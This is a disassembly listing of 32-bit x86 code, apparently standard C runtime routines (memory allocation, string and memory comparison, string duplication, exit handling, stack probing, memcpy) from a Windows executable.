  402a6d:	75 05                	jne    0x402a74
  402a6f:	be 01 00 00 00       	mov    $0x1,%esi
  402a74:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402a78:	83 fe e0             	cmp    $0xffffffe0,%esi
  402a7b:	77 0b                	ja     0x402a88
  402a7d:	56                   	push   %esi
  402a7e:	e8 2d 00 00 00       	call   0x402ab0
  402a83:	83 c4 04             	add    $0x4,%esp
  402a86:	eb 02                	jmp    0x402a8a
  402a88:	33 c0                	xor    %eax,%eax
  402a8a:	85 c0                	test   %eax,%eax
  402a8c:	75 13                	jne    0x402aa1
  402a8e:	85 ff                	test   %edi,%edi
  402a90:	74 0f                	je     0x402aa1
  402a92:	56                   	push   %esi
  402a93:	e8 88 3b 00 00       	call   0x406620
  402a98:	83 c4 04             	add    $0x4,%esp
  402a9b:	85 c0                	test   %eax,%eax
  402a9d:	75 d9                	jne    0x402a78
  402a9f:	33 c0                	xor    %eax,%eax
  402aa1:	5f                   	pop    %edi
  402aa2:	5e                   	pop    %esi
  402aa3:	c3                   	ret
  402aa4:	90                   	nop
  402aa5:	90                   	nop
  402aa6:	90                   	nop
  402aa7:	90                   	nop
  402aa8:	90                   	nop
  402aa9:	90                   	nop
  402aaa:	90                   	nop
  402aab:	90                   	nop
  402aac:	90                   	nop
  402aad:	90                   	nop
  402aae:	90                   	nop
  402aaf:	90                   	nop
  402ab0:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ab4:	56                   	push   %esi
  402ab5:	57                   	push   %edi
  402ab6:	8d 70 0f             	lea    0xf(%eax),%esi
  402ab9:	a1 24 be 42 00       	mov    0x42be24,%eax
  402abe:	83 e6 f0             	and    $0xfffffff0,%esi
  402ac1:	3b f0                	cmp    %eax,%esi
  402ac3:	77 2d                	ja     0x402af2
  402ac5:	6a 09                	push   $0x9
  402ac7:	e8 04 39 00 00       	call   0x4063d0
  402acc:	8b ce                	mov    %esi,%ecx
  402ace:	83 c4 04             	add    $0x4,%esp
  402ad1:	c1 e9 04             	shr    $0x4,%ecx
  402ad4:	51                   	push   %ecx
  402ad5:	e8 c6 3e 00 00       	call   0x4069a0
  402ada:	83 c4 04             	add    $0x4,%esp
  402add:	8b f8                	mov    %eax,%edi
  402adf:	6a 09                	push   $0x9
  402ae1:	e8 6a 39 00 00       	call   0x406450
  402ae6:	83 c4 04             	add    $0x4,%esp
  402ae9:	85 ff                	test   %edi,%edi
  402aeb:	74 05                	je     0x402af2
  402aed:	8b c7                	mov    %edi,%eax
  402aef:	5f                   	pop    %edi
  402af0:	5e                   	pop    %esi
  402af1:	c3                   	ret
  402af2:	8b 15 8c 02 43 00    	mov    0x43028c,%edx
  402af8:	56                   	push   %esi
  402af9:	6a 00                	push   $0x0
  402afb:	52                   	push   %edx
  402afc:	ff 15 40 17 43 00    	call   *0x431740
  402b02:	5f                   	pop    %edi
  402b03:	5e                   	pop    %esi
  402b04:	c3                   	ret
  402b05:	90                   	nop
  402b06:	90                   	nop
  402b07:	90                   	nop
  402b08:	90                   	nop
  402b09:	90                   	nop
  402b0a:	90                   	nop
  402b0b:	90                   	nop
  402b0c:	90                   	nop
  402b0d:	90                   	nop
  402b0e:	90                   	nop
  402b0f:	90                   	nop
  402b10:	51                   	push   %ecx
  402b11:	56                   	push   %esi
  402b12:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402b16:	85 f6                	test   %esi,%esi
  402b18:	74 5b                	je     0x402b75
  402b1a:	6a 09                	push   $0x9
  402b1c:	e8 af 38 00 00       	call   0x4063d0
  402b21:	83 c4 04             	add    $0x4,%esp
  402b24:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402b28:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402b2c:	50                   	push   %eax
  402b2d:	51                   	push   %ecx
  402b2e:	56                   	push   %esi
  402b2f:	e8 ac 3d 00 00       	call   0x4068e0
  402b34:	83 c4 0c             	add    $0xc,%esp
  402b37:	85 c0                	test   %eax,%eax
  402b39:	74 20                	je     0x402b5b
  402b3b:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402b3f:	50                   	push   %eax
  402b40:	8b 44 24 08          	mov    0x8(%esp),%eax
  402b44:	52                   	push   %edx
  402b45:	50                   	push   %eax
  402b46:	e8 f5 3d 00 00       	call   0x406940
  402b4b:	83 c4 0c             	add    $0xc,%esp
  402b4e:	6a 09                	push   $0x9
  402b50:	e8 fb 38 00 00       	call   0x406450
  402b55:	83 c4 04             	add    $0x4,%esp
  402b58:	5e                   	pop    %esi
  402b59:	59                   	pop    %ecx
  402b5a:	c3                   	ret
  402b5b:	6a 09                	push   $0x9
  402b5d:	e8 ee 38 00 00       	call   0x406450
  402b62:	8b 0d 8c 02 43 00    	mov    0x43028c,%ecx
  402b68:	83 c4 04             	add    $0x4,%esp
  402b6b:	56                   	push   %esi
  402b6c:	6a 00                	push   $0x0
  402b6e:	51                   	push   %ecx
  402b6f:	ff 15 3c 17 43 00    	call   *0x43173c
  402b75:	5e                   	pop    %esi
  402b76:	59                   	pop    %ecx
  402b77:	c3                   	ret
  402b78:	90                   	nop
  402b79:	90                   	nop
  402b7a:	90                   	nop
  402b7b:	90                   	nop
  402b7c:	90                   	nop
  402b7d:	90                   	nop
  402b7e:	90                   	nop
  402b7f:	90                   	nop
  402b80:	a1 04 ef 42 00       	mov    0x42ef04,%eax
  402b85:	53                   	push   %ebx
  402b86:	55                   	push   %ebp
  402b87:	33 ed                	xor    %ebp,%ebp
  402b89:	56                   	push   %esi
  402b8a:	3b c5                	cmp    %ebp,%eax
  402b8c:	57                   	push   %edi
  402b8d:	75 41                	jne    0x402bd0
  402b8f:	8b 74 24 18          	mov    0x18(%esp),%esi
  402b93:	8b 44 24 14          	mov    0x14(%esp),%eax
  402b97:	8a 10                	mov    (%eax),%dl
  402b99:	8a 1e                	mov    (%esi),%bl
  402b9b:	8a ca                	mov    %dl,%cl
  402b9d:	3a d3                	cmp    %bl,%dl
  402b9f:	75 25                	jne    0x402bc6
  402ba1:	84 c9                	test   %cl,%cl
  402ba3:	0f 84 c7 00 00 00    	je     0x402c70
  402ba9:	8a 50 01             	mov    0x1(%eax),%dl
  402bac:	8a 5e 01             	mov    0x1(%esi),%bl
  402baf:	8a ca                	mov    %dl,%cl
  402bb1:	3a d3                	cmp    %bl,%dl
  402bb3:	75 11                	jne    0x402bc6
  402bb5:	83 c0 02             	add    $0x2,%eax
  402bb8:	83 c6 02             	add    $0x2,%esi
  402bbb:	84 c9                	test   %cl,%cl
  402bbd:	75 d8                	jne    0x402b97
  402bbf:	33 c0                	xor    %eax,%eax
  402bc1:	5f                   	pop    %edi
  402bc2:	5e                   	pop    %esi
  402bc3:	5d                   	pop    %ebp
  402bc4:	5b                   	pop    %ebx
  402bc5:	c3                   	ret
  402bc6:	1b c0                	sbb    %eax,%eax
  402bc8:	83 d8 ff             	sbb    $0xffffffff,%eax
  402bcb:	5f                   	pop    %edi
  402bcc:	5e                   	pop    %esi
  402bcd:	5d                   	pop    %ebp
  402bce:	5b                   	pop    %ebx
  402bcf:	c3                   	ret
  402bd0:	6a 19                	push   $0x19
  402bd2:	e8 f9 37 00 00       	call   0x4063d0
  402bd7:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  402bdb:	8b 7c 24 18          	mov    0x18(%esp),%edi
  402bdf:	83 c4 04             	add    $0x4,%esp
  402be2:	b2 04                	mov    $0x4,%dl
  402be4:	66 0f b6 0f          	movzbw (%edi),%cx
  402be8:	8b c1                	mov    %ecx,%eax
  402bea:	47                   	inc    %edi
  402beb:	25 ff 00 00 00       	and    $0xff,%eax
  402bf0:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  402bf4:	84 90 01 ee 42 00    	test   %dl,0x42ee01(%eax)
  402bfa:	74 1b                	je     0x402c17
  402bfc:	8a 07                	mov    (%edi),%al
  402bfe:	84 c0                	test   %al,%al
  402c00:	75 06                	jne    0x402c08
  402c02:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  402c06:	eb 0b                	jmp    0x402c13
  402c08:	33 db                	xor    %ebx,%ebx
  402c0a:	47                   	inc    %edi
  402c0b:	8a f9                	mov    %cl,%bh
  402c0d:	8a d8                	mov    %al,%bl
  402c0f:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  402c13:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402c17:	66 0f b6 1e          	movzbw (%esi),%bx
  402c1b:	8b c3                	mov    %ebx,%eax
  402c1d:	46                   	inc    %esi
  402c1e:	25 ff 00 00 00       	and    $0xff,%eax
  402c23:	84 90 01 ee 42 00    	test   %dl,0x42ee01(%eax)
  402c29:	74 15                	je     0x402c40
  402c2b:	8a 06                	mov    (%esi),%al
  402c2d:	84 c0                	test   %al,%al
  402c2f:	75 04                	jne    0x402c35
  402c31:	33 db                	xor    %ebx,%ebx
  402c33:	eb 0b                	jmp    0x402c40
  402c35:	33 d2                	xor    %edx,%edx
  402c37:	46                   	inc    %esi
  402c38:	8a f3                	mov    %bl,%dh
  402c3a:	8a d0                	mov    %al,%dl
  402c3c:	8b da                	mov    %edx,%ebx
  402c3e:	b2 04                	mov    $0x4,%dl
  402c40:	66 3b cb             	cmp    %bx,%cx
  402c43:	75 07                	jne    0x402c4c
  402c45:	66 3b cd             	cmp    %bp,%cx
  402c48:	74 1c                	je     0x402c66
  402c4a:	eb 98                	jmp    0x402be4
  402c4c:	6a 19                	push   $0x19
  402c4e:	e8 fd 37 00 00       	call   0x406450
  402c53:	83 c4 04             	add    $0x4,%esp
  402c56:	66 3b 5c 24 18       	cmp    0x18(%esp),%bx
  402c5b:	1b c0                	sbb    %eax,%eax
  402c5d:	83 e0 02             	and    $0x2,%eax
  402c60:	48                   	dec    %eax
  402c61:	5f                   	pop    %edi
  402c62:	5e                   	pop    %esi
  402c63:	5d                   	pop    %ebp
  402c64:	5b                   	pop    %ebx
  402c65:	c3                   	ret
  402c66:	6a 19                	push   $0x19
  402c68:	e8 e3 37 00 00       	call   0x406450
  402c6d:	83 c4 04             	add    $0x4,%esp
  402c70:	5f                   	pop    %edi
  402c71:	5e                   	pop    %esi
  402c72:	5d                   	pop    %ebp
  402c73:	33 c0                	xor    %eax,%eax
  402c75:	5b                   	pop    %ebx
  402c76:	c3                   	ret
  402c77:	90                   	nop
  402c78:	90                   	nop
  402c79:	90                   	nop
  402c7a:	90                   	nop
  402c7b:	90                   	nop
  402c7c:	90                   	nop
  402c7d:	90                   	nop
  402c7e:	90                   	nop
  402c7f:	90                   	nop
  402c80:	83 ec 20             	sub    $0x20,%esp
  402c83:	8b 44 24 24          	mov    0x24(%esp),%eax
  402c87:	56                   	push   %esi
  402c88:	57                   	push   %edi
  402c89:	b9 08 00 00 00       	mov    $0x8,%ecx
  402c8e:	be 98 4e 42 00       	mov    $0x424e98,%esi
  402c93:	8d 7c 24 08          	lea    0x8(%esp),%edi
  402c97:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402c99:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  402c9d:	89 44 24 20          	mov    %eax,0x20(%esp)
  402ca1:	8b 44 24 18          	mov    0x18(%esp),%eax
  402ca5:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  402ca9:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  402cad:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402cb1:	52                   	push   %edx
  402cb2:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402cb6:	50                   	push   %eax
  402cb7:	51                   	push   %ecx
  402cb8:	52                   	push   %edx
  402cb9:	ff 15 38 17 43 00    	call   *0x431738
  402cbf:	5f                   	pop    %edi
  402cc0:	5e                   	pop    %esi
  402cc1:	83 c4 20             	add    $0x20,%esp
  402cc4:	c2 08 00             	ret    $0x8
  402cc7:	90                   	nop
  402cc8:	90                   	nop
  402cc9:	90                   	nop
  402cca:	90                   	nop
  402ccb:	90                   	nop
  402ccc:	90                   	nop
  402ccd:	90                   	nop
  402cce:	90                   	nop
  402ccf:	90                   	nop
  402cd0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402cd4:	85 c0                	test   %eax,%eax
  402cd6:	74 44                	je     0x402d1c
  402cd8:	8b 54 24 04          	mov    0x4(%esp),%edx
  402cdc:	56                   	push   %esi
  402cdd:	57                   	push   %edi
  402cde:	8b f2                	mov    %edx,%esi
  402ce0:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402ce4:	0b d7                	or     %edi,%edx
  402ce6:	83 e2 03             	and    $0x3,%edx
  402ce9:	74 32                	je     0x402d1d
  402ceb:	a9 01 00 00 00       	test   $0x1,%eax
  402cf0:	74 0b                	je     0x402cfd
  402cf2:	8a 0e                	mov    (%esi),%cl
  402cf4:	3a 0f                	cmp    (%edi),%cl
  402cf6:	75 52                	jne    0x402d4a
  402cf8:	46                   	inc    %esi
  402cf9:	47                   	inc    %edi
  402cfa:	48                   	dec    %eax
  402cfb:	74 1d                	je     0x402d1a
  402cfd:	8a 0e                	mov    (%esi),%cl
  402cff:	8a 17                	mov    (%edi),%dl
  402d01:	38 d1                	cmp    %dl,%cl
  402d03:	75 45                	jne    0x402d4a
  402d05:	8a 4e 01             	mov    0x1(%esi),%cl
  402d08:	8a 57 01             	mov    0x1(%edi),%dl
  402d0b:	38 d1                	cmp    %dl,%cl
  402d0d:	75 3b                	jne    0x402d4a
  402d0f:	83 c7 02             	add    $0x2,%edi
  402d12:	83 c6 02             	add    $0x2,%esi
  402d15:	83 e8 02             	sub    $0x2,%eax
  402d18:	75 e3                	jne    0x402cfd
  402d1a:	5f                   	pop    %edi
  402d1b:	5e                   	pop    %esi
  402d1c:	c3                   	ret
  402d1d:	8b c8                	mov    %eax,%ecx
  402d1f:	83 e0 03             	and    $0x3,%eax
  402d22:	c1 e9 02             	shr    $0x2,%ecx
  402d25:	74 2b                	je     0x402d52
  402d27:	f3 a7                	repz cmpsl %es:(%edi),%ds:(%esi)
  402d29:	74 27                	je     0x402d52
  402d2b:	8b 4e fc             	mov    -0x4(%esi),%ecx
  402d2e:	8b 57 fc             	mov    -0x4(%edi),%edx
  402d31:	38 d1                	cmp    %dl,%cl
  402d33:	75 10                	jne    0x402d45
  402d35:	38 f5                	cmp    %dh,%ch
  402d37:	75 0c                	jne    0x402d45
  402d39:	c1 e9 10             	shr    $0x10,%ecx
  402d3c:	c1 ea 10             	shr    $0x10,%edx
  402d3f:	38 d1                	cmp    %dl,%cl
  402d41:	75 02                	jne    0x402d45
  402d43:	38 f5                	cmp    %dh,%ch
  402d45:	b8 00 00 00 00       	mov    $0x0,%eax
  402d4a:	1b c0                	sbb    %eax,%eax
  402d4c:	5f                   	pop    %edi
  402d4d:	83 d8 ff             	sbb    $0xffffffff,%eax
  402d50:	5e                   	pop    %esi
  402d51:	c3                   	ret
  402d52:	85 c0                	test   %eax,%eax
  402d54:	74 c4                	je     0x402d1a
  402d56:	8b 16                	mov    (%esi),%edx
  402d58:	8b 0f                	mov    (%edi),%ecx
  402d5a:	38 ca                	cmp    %cl,%dl
  402d5c:	75 e7                	jne    0x402d45
  402d5e:	48                   	dec    %eax
  402d5f:	74 18                	je     0x402d79
  402d61:	38 ee                	cmp    %ch,%dh
  402d63:	75 e0                	jne    0x402d45
  402d65:	48                   	dec    %eax
  402d66:	74 11                	je     0x402d79
  402d68:	81 e1 00 00 ff 00    	and    $0xff0000,%ecx
  402d6e:	81 e2 00 00 ff 00    	and    $0xff0000,%edx
  402d74:	3b d1                	cmp    %ecx,%edx
  402d76:	75 cd                	jne    0x402d45
  402d78:	48                   	dec    %eax
  402d79:	5f                   	pop    %edi
  402d7a:	5e                   	pop    %esi
  402d7b:	c3                   	ret
  402d7c:	cc                   	int3
  402d7d:	cc                   	int3
  402d7e:	cc                   	int3
  402d7f:	cc                   	int3
  402d80:	53                   	push   %ebx
  402d81:	56                   	push   %esi
  402d82:	8b 74 24 0c          	mov    0xc(%esp),%esi
  402d86:	57                   	push   %edi
  402d87:	85 f6                	test   %esi,%esi
  402d89:	74 3f                	je     0x402dca
  402d8b:	8b fe                	mov    %esi,%edi
  402d8d:	83 c9 ff             	or     $0xffffffff,%ecx
  402d90:	33 c0                	xor    %eax,%eax
  402d92:	f2 ae                	repnz scas %es:(%edi),%al
  402d94:	f7 d1                	not    %ecx
  402d96:	51                   	push   %ecx
  402d97:	e8 a4 fc ff ff       	call   0x402a40
  402d9c:	8b d0                	mov    %eax,%edx
  402d9e:	83 c4 04             	add    $0x4,%esp
  402da1:	85 d2                	test   %edx,%edx
  402da3:	74 25                	je     0x402dca
  402da5:	8b fe                	mov    %esi,%edi
  402da7:	83 c9 ff             	or     $0xffffffff,%ecx
  402daa:	33 c0                	xor    %eax,%eax
  402dac:	f2 ae                	repnz scas %es:(%edi),%al
  402dae:	f7 d1                	not    %ecx
  402db0:	2b f9                	sub    %ecx,%edi
  402db2:	8b f7                	mov    %edi,%esi
  402db4:	8b d9                	mov    %ecx,%ebx
  402db6:	8b fa                	mov    %edx,%edi
  402db8:	8b c7                	mov    %edi,%eax
  402dba:	c1 e9 02             	shr    $0x2,%ecx
  402dbd:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402dbf:	8b cb                	mov    %ebx,%ecx
  402dc1:	83 e1 03             	and    $0x3,%ecx
  402dc4:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402dc6:	5f                   	pop    %edi
  402dc7:	5e                   	pop    %esi
  402dc8:	5b                   	pop    %ebx
  402dc9:	c3                   	ret
  402dca:	5f                   	pop    %edi
  402dcb:	5e                   	pop    %esi
  402dcc:	33 c0                	xor    %eax,%eax
  402dce:	5b                   	pop    %ebx
  402dcf:	c3                   	ret
  402dd0:	a1 ac 03 43 00       	mov    0x4303ac,%eax
  402dd5:	85 c0                	test   %eax,%eax
  402dd7:	74 02                	je     0x402ddb
  402dd9:	ff d0                	call   *%eax
  402ddb:	68 80 90 42 00       	push   $0x429080
  402de0:	68 70 90 42 00       	push   $0x429070
  402de5:	e8 36 01 00 00       	call   0x402f20
  402dea:	83 c4 08             	add    $0x8,%esp
  402ded:	68 6c 90 42 00       	push   $0x42906c
  402df2:	68 00 90 42 00       	push   $0x429000
  402df7:	e8 24 01 00 00       	call   0x402f20
  402dfc:	83 c4 08             	add    $0x8,%esp
  402dff:	c3                   	ret
  402e00:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e04:	6a 00                	push   $0x0
  402e06:	6a 00                	push   $0x0
  402e08:	50                   	push   %eax
  402e09:	e8 32 00 00 00       	call   0x402e40
  402e0e:	83 c4 0c             	add    $0xc,%esp
  402e11:	c3                   	ret
  402e12:	90                   	nop
  402e13:	90                   	nop
  402e14:	90                   	nop
  402e15:	90                   	nop
  402e16:	90                   	nop
  402e17:	90                   	nop
  402e18:	90                   	nop
  402e19:	90                   	nop
  402e1a:	90                   	nop
  402e1b:	90                   	nop
  402e1c:	90                   	nop
  402e1d:	90                   	nop
  402e1e:	90                   	nop
  402e1f:	90                   	nop
  402e20:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e24:	6a 00                	push   $0x0
  402e26:	6a 01                	push   $0x1
  402e28:	50                   	push   %eax
  402e29:	e8 12 00 00 00       	call   0x402e40
  402e2e:	83 c4 0c             	add    $0xc,%esp
  402e31:	c3                   	ret
  402e32:	90                   	nop
  402e33:	90                   	nop
  402e34:	90                   	nop
  402e35:	90                   	nop
  402e36:	90                   	nop
  402e37:	90                   	nop
  402e38:	90                   	nop
  402e39:	90                   	nop
  402e3a:	90                   	nop
  402e3b:	90                   	nop
  402e3c:	90                   	nop
  402e3d:	90                   	nop
  402e3e:	90                   	nop
  402e3f:	90                   	nop
  402e40:	53                   	push   %ebx
  402e41:	55                   	push   %ebp
  402e42:	56                   	push   %esi
  402e43:	e8 b8 00 00 00       	call   0x402f00
  402e48:	a1 f8 ed 42 00       	mov    0x42edf8,%eax
  402e4d:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  402e51:	83 f8 01             	cmp    $0x1,%eax
  402e54:	75 0e                	jne    0x402e64
  402e56:	55                   	push   %ebp
  402e57:	ff 15 b4 17 43 00    	call   *0x4317b4
  402e5d:	50                   	push   %eax
  402e5e:	ff 15 30 17 43 00    	call   *0x431730
  402e64:	8b 44 24 14          	mov    0x14(%esp),%eax
  402e68:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  402e6c:	85 c0                	test   %eax,%eax
  402e6e:	c7 05 f4 ed 42 00 01 	movl   $0x1,0x42edf4
  402e75:	00 00 00 
  402e78:	88 1d f0 ed 42 00    	mov    %bl,0x42edf0
  402e7e:	75 3e                	jne    0x402ebe
  402e80:	8b 0d a8 03 43 00    	mov    0x4303a8,%ecx
  402e86:	85 c9                	test   %ecx,%ecx
  402e88:	74 22                	je     0x402eac
  402e8a:	8b 35 a4 03 43 00    	mov    0x4303a4,%esi
  402e90:	83 ee 04             	sub    $0x4,%esi
  402e93:	3b f1                	cmp    %ecx,%esi
  402e95:	72 15                	jb     0x402eac
  402e97:	8b 06                	mov    (%esi),%eax
  402e99:	85 c0                	test   %eax,%eax
  402e9b:	74 08                	je     0x402ea5
  402e9d:	ff d0                	call   *%eax
  402e9f:	8b 0d a8 03 43 00    	mov    0x4303a8,%ecx
  402ea5:	83 ee 04             	sub    $0x4,%esi
  402ea8:	3b f1                	cmp    %ecx,%esi
  402eaa:	73 eb                	jae    0x402e97
  402eac:	68 8c 90 42 00       	push   $0x42908c
  402eb1:	68 84 90 42 00       	push   $0x429084
  402eb6:	e8 65 00 00 00       	call   0x402f20
  402ebb:	83 c4 08             	add    $0x8,%esp
  402ebe:	68 98 90 42 00       	push   $0x429098
  402ec3:	68 90 90 42 00       	push   $0x429090
  402ec8:	e8 53 00 00 00       	call   0x402f20
  402ecd:	83 c4 08             	add    $0x8,%esp
  402ed0:	85 db                	test   %ebx,%ebx
  402ed2:	74 09                	je     0x402edd
  402ed4:	e8 37 00 00 00       	call   0x402f10
  402ed9:	5e                   	pop    %esi
  402eda:	5d                   	pop    %ebp
  402edb:	5b                   	pop    %ebx
  402edc:	c3                   	ret
  402edd:	55                   	push   %ebp
  402ede:	c7 05 f8 ed 42 00 01 	movl   $0x1,0x42edf8
  402ee5:	00 00 00 
  402ee8:	ff 15 34 17 43 00    	call   *0x431734
  402eee:	5e                   	pop    %esi
  402eef:	5d                   	pop    %ebp
  402ef0:	5b                   	pop    %ebx
  402ef1:	c3                   	ret
  402ef2:	90                   	nop
  402ef3:	90                   	nop
  402ef4:	90                   	nop
  402ef5:	90                   	nop
  402ef6:	90                   	nop
  402ef7:	90                   	nop
  402ef8:	90                   	nop
  402ef9:	90                   	nop
  402efa:	90                   	nop
  402efb:	90                   	nop
  402efc:	90                   	nop
  402efd:	90                   	nop
  402efe:	90                   	nop
  402eff:	90                   	nop
  402f00:	6a 0d                	push   $0xd
  402f02:	e8 c9 34 00 00       	call   0x4063d0
  402f07:	83 c4 04             	add    $0x4,%esp
  402f0a:	c3                   	ret
  402f0b:	90                   	nop
  402f0c:	90                   	nop
  402f0d:	90                   	nop
  402f0e:	90                   	nop
  402f0f:	90                   	nop
  402f10:	6a 0d                	push   $0xd
  402f12:	e8 39 35 00 00       	call   0x406450
  402f17:	83 c4 04             	add    $0x4,%esp
  402f1a:	c3                   	ret
  402f1b:	90                   	nop
  402f1c:	90                   	nop
  402f1d:	90                   	nop
  402f1e:	90                   	nop
  402f1f:	90                   	nop
  402f20:	56                   	push   %esi
  402f21:	8b 74 24 08          	mov    0x8(%esp),%esi
  402f25:	57                   	push   %edi
  402f26:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402f2a:	3b f7                	cmp    %edi,%esi
  402f2c:	73 0f                	jae    0x402f3d
  402f2e:	8b 06                	mov    (%esi),%eax
  402f30:	85 c0                	test   %eax,%eax
  402f32:	74 02                	je     0x402f36
  402f34:	ff d0                	call   *%eax
  402f36:	83 c6 04             	add    $0x4,%esi
  402f39:	3b f7                	cmp    %edi,%esi
  402f3b:	72 f1                	jb     0x402f2e
  402f3d:	5f                   	pop    %edi
  402f3e:	5e                   	pop    %esi
  402f3f:	c3                   	ret
  402f40:	51                   	push   %ecx
  402f41:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402f46:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  402f4a:	72 14                	jb     0x402f60
  402f4c:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  402f52:	2d 00 10 00 00       	sub    $0x1000,%eax
  402f57:	85 01                	test   %eax,(%ecx)
  402f59:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402f5e:	73 ec                	jae    0x402f4c
  402f60:	2b c8                	sub    %eax,%ecx
  402f62:	8b c4                	mov    %esp,%eax
  402f64:	85 01                	test   %eax,(%ecx)
  402f66:	8b e1                	mov    %ecx,%esp
  402f68:	8b 08                	mov    (%eax),%ecx
  402f6a:	8b 40 04             	mov    0x4(%eax),%eax
  402f6d:	50                   	push   %eax
  402f6e:	c3                   	ret
  402f6f:	cc                   	int3
  402f70:	6a 19                	push   $0x19
  402f72:	e8 f9 f8 ff ff       	call   0x402870
  402f77:	83 c4 04             	add    $0x4,%esp
  402f7a:	c3                   	ret
  402f7b:	90                   	nop
  402f7c:	90                   	nop
  402f7d:	90                   	nop
  402f7e:	90                   	nop
  402f7f:	90                   	nop
  402f80:	55                   	push   %ebp
  402f81:	8b ec                	mov    %esp,%ebp
  402f83:	57                   	push   %edi
  402f84:	56                   	push   %esi
  402f85:	8b 75 0c             	mov    0xc(%ebp),%esi
  402f88:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402f8b:	8b 7d 08             	mov    0x8(%ebp),%edi
  402f8e:	8b c1                	mov    %ecx,%eax
  402f90:	8b d1                	mov    %ecx,%edx
  402f92:	03 c6                	add    %esi,%eax
  402f94:	3b fe                	cmp    %esi,%edi
  402f96:	76 08                	jbe    0x402fa0
  402f98:	3b f8                	cmp    %eax,%edi
  402f9a:	0f 82 78 01 00 00    	jb     0x403118
  402fa0:	f7 c7 03 00 00 00    	test   $0x3,%edi
  402fa6:	75 14                	jne    0x402fbc
  402fa8:	c1 e9 02             	shr    $0x2,%ecx
  402fab:	83 e2 03             	and    $0x3,%edx
  402fae:	83 f9 08             	cmp    $0x8,%ecx
  402fb1:	72 29                	jb     0x402fdc
  402fb3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402fb5:	ff 24 95 c8 30 40 00 	jmp    *0x4030c8(,%edx,4)
  402fbc:	8b c7                	mov    %edi,%eax
  402fbe:	ba 03 00 00 00       	mov    $0x3,%edx
  402fc3:	83 e9 04             	sub    $0x4,%ecx
  402fc6:	72 0c                	jb     0x402fd4
  402fc8:	83 e0 03             	and    $0x3,%eax
  402fcb:	03 c8                	add    %eax,%ecx
  402fcd:	ff 24 85 e0 2f 40 00 	jmp    *0x402fe0(,%eax,4)
  402fd4:	ff 24 8d d8 30 40 00 	jmp    *0x4030d8(,%ecx,4)
  402fdb:	90                   	nop
  402fdc:	ff 24 8d 5c 30 40 00 	jmp    *0x40305c(,%ecx,4)
  402fe3:	90                   	nop
  402fe4:	f0 2f                	lock das
  402fe6:	40                   	inc    %eax
  402fe7:	00 1c 30             	add    %bl,(%eax,%esi,1)
  402fea:	40                   	inc    %eax
  402feb:	00 40 30             	add    %al,0x30(%eax)
  402fee:	40                   	inc    %eax
  402fef:	00 23                	add    %ah,(%ebx)
  402ff1:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  402ff7:	46                   	inc    %esi
  402ff8:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  402ffe:	02 c1                	add    %cl,%al
  403000:	e9 02 88 47 02       	jmp    0x287b807
  403005:	83 c6 03             	add    $0x3,%esi
  403008:	83 c7 03             	add    $0x3,%edi
  40300b:	83 f9 08             	cmp    $0x8,%ecx
  40300e:	72 cc                	jb     0x402fdc
  403010:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403012:	ff 24 95 c8 30 40 00 	jmp    *0x4030c8(,%edx,4)
  403019:	2e 8b c0             	cs mov %eax,%eax
  40301c:	23 d1                	and    %ecx,%edx
  40301e:	8a 06                	mov    (%esi),%al
  403020:	88 07                	mov    %al,(%edi)
  403022:	8a 46 01             	mov    0x1(%esi),%al
  403025:	c1 e9 02             	shr    $0x2,%ecx
  403028:	88 47 01             	mov    %al,0x1(%edi)
  40302b:	83 c6 02             	add    $0x2,%esi
  40302e:	83 c7 02             	add    $0x2,%edi
  403031:	83 f9 08             	cmp    $0x8,%ecx
  403034:	72 a6                	jb     0x402fdc
  403036:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403038:	ff 24 95 c8 30 40 00 	jmp    *0x4030c8(,%edx,4)
  40303f:	90                   	nop
  403040:	23 d1                	and    %ecx,%edx
  403042:	8a 06                	mov    (%esi),%al
  403044:	88 07                	mov    %al,(%edi)
  403046:	46                   	inc    %esi
  403047:	c1 e9 02             	shr    $0x2,%ecx
  40304a:	47                   	inc    %edi
  40304b:	83 f9 08             	cmp    $0x8,%ecx
  40304e:	72 8c                	jb     0x402fdc
  403050:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403052:	ff 24 95 c8 30 40 00 	jmp    *0x4030c8(,%edx,4)
  403059:	2e 8b c0             	cs mov %eax,%eax
  40305c:	bf 30 40 00 ac       	mov    $0xac004030,%edi
  403061:	30 40 00             	xor    %al,0x0(%eax)
  403064:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403065:	30 40 00             	xor    %al,0x0(%eax)
  403068:	9c                   	pushf
  403069:	30 40 00             	xor    %al,0x0(%eax)
  40306c:	94                   	xchg   %eax,%esp
  40306d:	30 40 00             	xor    %al,0x0(%eax)
